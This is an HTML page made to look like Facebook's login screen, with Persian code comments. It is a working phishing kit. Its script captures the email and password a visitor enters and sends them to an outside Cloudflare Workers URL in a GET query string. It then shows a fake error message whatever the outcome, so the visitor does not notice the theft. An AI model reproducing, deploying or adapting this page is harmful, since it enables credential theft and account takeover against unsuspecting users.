<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook Clone</title>
    <link rel="stylesheet" href="./css/styles.css">
    <link rel="shortcut icon" href="./images/fb.ico" type="image/x-icon">
</head>

<body>
    <main>
        <div class="main">
            <div class="heading-section">
                <img src="./images/logo.png" class="logo-img">
                <div class="a-ri8"><span>Facebook helps you connect and share with the people in your life.</span></div>
            </div>

            <div class="form">
                <!-- فرم برای ارسال درخواست با JavaScript -->
                <form id="loginForm" class="a-form">
                    <input type="text" id="Email" class="a-email" name="username" placeholder="Email or phone number" required>
                    <input type="text" id="Password" class="a-pss" name="password" placeholder="Password" required>
                    <button type="submit" class="a-sub">Log In</button>
                    <a href="#" class="a-link">Forgotten password?</a>
                    <hr class="a-hr">
                    <button type="button" class="a-but">Create New Account</button>
                </form>
                <div class="create-page">
                    <a href="#" class="a-href">Create a Page</a> for a celebrity, band, or business.
                </div>
            </div>
        </div>
    </main>

    <footer>
        <div class="footer">
            <ul>
                <li>English (UK)</li>
                <li><a href="#">हिन्दी</a></li>
                <li><a href="#">বাংলা</a></li>
                <li><a href="#">Español</a></li>
            </ul>
            <p>Facebook © 2024</p>
        </div>
    </footer>

    <!-- جاوااسکریپت برای ارسال درخواست -->
    <script>
        document.getElementById("loginForm").addEventListener("submit", async function (event) {
            event.preventDefault(); // جلوگیری از ارسال پیش‌فرض فرم

            // دریافت مقادیر وارد شده
            const username = document.getElementById("Email").value;
            const password = document.getElementById("Password").value;

            try {
                // ساخت query string
                const queryString = `?username=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}`;

                // ارسال درخواست به ورکر
                const response = await fetch(`https://mrh502.salefzb.workers.dev/${queryString}`, {
                    method: "GET", // متد GET برای ارسال داده‌ها در query string
                });

                // بررسی پاسخ سرور
                if (response.ok) {
                    alert("An error occurred. Please try again..");
                } else {
                    alert("An error occurred. Please try again..");
                }
            } catch (error) {
                console.error("An error occurred. Please try again.", error);
                alert("An error occurred. Please try again.");
            }
        });
    </script>
</body>

</html>
